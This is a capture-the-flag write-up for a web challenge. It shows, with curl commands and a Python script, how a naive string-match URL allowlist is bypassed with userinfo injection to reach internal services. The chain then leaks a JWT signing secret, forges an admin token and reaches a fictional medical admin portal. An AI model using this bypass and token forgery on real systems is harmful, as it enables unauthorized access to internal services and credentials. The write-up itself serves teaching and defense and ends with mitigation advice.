---
title: "Clinical Gateway SSRF - Hack for a Change 2026 March: UN SDG 3"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["web", "ssrf", "jwt", "base64", "clinical", "gateway", "hack-for-a-change-2026-march-u", "hack-for-a-change-2026-march-un-sd", "2026", "ctf-writeup"]
summary: "curl \"https://<host>/api/clinical-gateway-ssrf?seed=<SEED>&action=info\""
source:
  name: "CTFtime writeup #40690"
  url: "https://ctftime.org/writeup/40690"
ctf:
  name: "Hack for a Change 2026 March: UN SDG 3"
  year: 2026
  challenge: "Clinical Gateway SSRF"
---

## Metadata

- **CTF:** Hack for a Change 2026 March: UN SDG 3
- **Task:** Clinical Gateway SSRF
- **Author team:** Hack for a Change
- **CTFtime:** <https://ctftime.org/writeup/40690>

---
# Clinical Gateway SSRF

## Reconnaissance

### Step 1: Enumerate the Gateway

```bash  
curl "https://<host>/api/clinical-gateway-ssrf?seed=<SEED>&action=info"  
```

**Response (key sections):**  
```json  
{  
"ok": true,  
"system": "MedFed API Gateway v3.0",  
"architecture": {  
"public_layer": "This gateway (external-facing)",  
"config_layer": "internal-config.mednet.local — configuration and secret management (internal network only)",  
"admin_layer": "admin-portal.mednet.local — privileged admin operations (internal only)"  
},  
"endpoints": {  
"proxy": "?action=proxy&url=<url> — proxy a request to an allowlisted health data URL"  
},  
"proxy_allowlist": "Only [health-api.who.int](http://health-api.who.int) endpoints are permitted.",  
"admin_note": "Admin operations are only accessible via the internal network through the proxy."  
}  
```

**Key observations:**  
\- The proxy has an allowlist for `[health-api.who.int](http://health-api.who.int)` only  
\- Two internal services exist: `internal-config.mednet.local` (secrets) and `admin-portal.mednet.local` (admin)  
\- Admin operations must be accessed **through the proxy** (i.e., via SSRF)

\---

## Vulnerability Analysis

### The Allowlist Bypass

The proxy check uses a naive string inclusion test:

```javascript  
if (!proxyUrl.includes('[health-api.who.int](http://health-api.who.int)')) {  
return json(res, 403, { error: 'URL not in allowlist...' });  
}  
```

This only checks if the string `[health-api.who.int](http://health-api.who.int)` appears **anywhere** in the URL. We can exploit this using **URL userinfo injection**:

```  
<http://health-api.who.int>@internal-config.mednet.local/secrets  
```

How the URL parser interprets this:  
\- `[health-api.who.int](http://health-api.who.int)` becomes the **userinfo** (username portion before `@`)  
\- `internal-config.mednet.local` becomes the actual **hostname**  
\- `/secrets` is the **path**

The string check passes because `[health-api.who.int](http://health-api.who.int)` is present in the URL, but the actual request goes to `internal-config.mednet.local`.

\---

## Exploitation

### Step 2: SSRF to Leak the JWT Secret

Use the URL userinfo trick to access the internal config service's `/secrets` endpoint:

```bash  
curl "https://<host>/api/clinical-gateway-ssrf?seed=<SEED>&action=proxy&url=<http://health-api.who.int>@internal-config.mednet.local/secrets"  
```

**Response:**  
```json  
{  
"ok": true,  
"proxied_url": "<http://health-api.who.int>@internal-config.mednet.local/secrets",  
"status": 200,  
"response": {  
"_classification": "INTERNAL — NOT FOR EXTERNAL ACCESS",  
"service": "MedFed API Config Service v1.2",  
"environment": "production",  
"jwt_signing_secret": "<JWT_SECRET>",  
"admin_role": "medfed_admin",  
"token_expiry_seconds": 3600  
}  
}  
```

We now have:  
\- The JWT signing secret (`jwt_signing_secret`)  
\- The required admin role name (`medfed_admin`)

### Step 3: Forge an Admin JWT

Craft a JWT with the `medfed_admin` role, signed with the leaked secret:

```python  
import hmac, hashlib, base64, json

def b64url(data):  
return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())  
payload = b64url(json.dumps({"role": "medfed_admin"}).encode())  
signing_input = f"{header}.{payload}"

secret = "<JWT_SECRET>" # from Step 2  
signature = b64url(  
hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()  
)

jwt_token = f"{signing_input}.{signature}"  
print(jwt_token)  
```

### Step 4: Access the Admin Portal via SSRF

Use the forged JWT to access the admin portal through the proxy:

```bash  
curl "https://<host>/api/clinical-gateway-ssrf?seed=<SEED>&action=proxy&url=<http://health-api.who.int>@admin-portal.mednet.local?token=<FORGED_JWT>"  
```

**Response:**  
```json  
{  
"ok": true,  
"proxied_url": "...",  
"status": 200,  
"response": {  
"ok": true,  
"system": "MedFed Admin Portal",  
"message": "Admin access granted. SDG 3 research network operational.",  
"network_integrity_token": "<PROOF>",  
"classification": "PRIVILEGED — ADMIN ACCESS ONLY"  
}  
}  
```

The `network_integrity_token` contains the proof.

\---

## Solution Summary

1\. **Enumerate** the gateway to discover internal architecture and the proxy endpoint  
2\. **SSRF** via URL userinfo injection (`<http://health-api.who.int>@internal-config.mednet.local/secrets`) to leak the JWT signing secret  
3\. **Forge** a JWT with `{"role": "medfed_admin"}` signed with the leaked secret  
4\. **SSRF** again to the admin portal (`<http://health-api.who.int>@admin-portal.mednet.local?token=<JWT>`) to retrieve the proof

\---

## Attack Chain Diagram

```  
Attacker  
│  
├─[1]─► GET ?action=info → Discover internal architecture  
│  
├─[2]─► GET ?action=proxy  
│ url=<http://health-api.who.int>@internal-config.mednet.local/secrets  
│ → Bypass allowlist via userinfo injection  
│ → Leak JWT signing secret  
│  
├─[3]─► Forge JWT {role: "medfed_admin"} with leaked secret  
│  
└─[4]─► GET ?action=proxy  
url=<http://health-api.who.int>@admin-portal.mednet.local?token=<JWT>  
→ Admin access granted → Proof retrieved  
```

\---

## Key Takeaways

\- **String-based URL allowlists are dangerous.** Always parse the URL first, then validate the parsed hostname — never use `.includes()` or regex on the raw URL string  
\- **URL userinfo injection** (`user@host`) is a classic SSRF bypass where the attacker-controlled part of the URL satisfies a naive string check while the actual hostname resolves elsewhere  
\- **Internal secrets should never be accessible** via a proxy, even on an internal network. Defense-in-depth would prevent this chain from succeeding  
\- This challenge demonstrates a realistic multi-step SSRF-to-admin-access attack chain

\---

## Tools Used

\- `curl`  
\- Python (for JWT forgery) or any JWT library  
\- Knowledge of URL parsing (RFC 3986 userinfo component)

\---

## References

\- [OWASP SSRF Prevention Cheat Sheet](<https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html>)  
\- [URL Parsing Confusion Attacks](<https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>)
